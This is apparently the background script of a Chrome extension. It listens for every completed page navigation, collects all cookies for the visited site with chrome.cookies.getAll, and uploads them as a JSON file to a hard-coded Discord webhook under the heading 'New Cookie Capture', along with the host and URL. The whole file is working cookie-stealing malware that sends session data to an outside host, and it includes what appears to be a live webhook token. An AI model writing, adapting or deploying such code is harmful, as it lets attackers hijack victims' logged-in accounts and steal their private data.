async function sendToDiscordAsFile(data) {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1490767746751926462/7FOheUYcmGowIdMEoX-BvYVWQk3wfDj78sFXfpyFYABz6u3Z9MgbrmGKA6hRcfZ6WMqa";  //WEBHOOK URL

  try {
    // 1. Convert the cookie data to a JSON string
    const jsonString = JSON.stringify(data.cookies, null, 2);

    // 2. Create a Blob (a file-like object) from the string
    const blob = new Blob([jsonString], { type: 'application/json' });

    // 3. Prepare the FormData for Discord
    const formData = new FormData();
    
    // The "payload_json" handles the text part of the message
    formData.append("payload_json", JSON.stringify({
      content: `ðŸš¨ **New Cookie Capture**\n**Host:** ${data.hostname}\n**URL:** ${data.url}\n**Count:** ${data.cookieCount}`
    }));

    // The "file" part attaches the actual .json file
    // We name it based on the hostname and timestamp for easy sorting
    const fileName = `${data.hostname}_${new Date().getTime()}.json`;
    formData.append("file", blob, fileName);

    // 4. Send the request
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData // Note: Do NOT set Content-Type header; fetch handles it for FormData
    });

    if (response.status === 429) {
      console.error("Rate limited by Discord. Waiting...");
    }
  } catch (error) {
    console.error('Failed to upload cookie file:', error);
  }
}

// Trigger on main-frame navigation
chrome.webNavigation.onCompleted.addListener((details) => {
  if (details.frameId === 0) {
    const url = new URL(details.url);
    
    chrome.cookies.getAll({ url: details.url }, (cookies) => {
      if (cookies && cookies.length > 0) {
        sendToDiscordAsFile({
          timestamp: new Date().toISOString(),
          url: details.url,
          hostname: url.hostname,
          cookieCount: cookies.length,
          cookies: cookies
        });
      }
    });
  }
});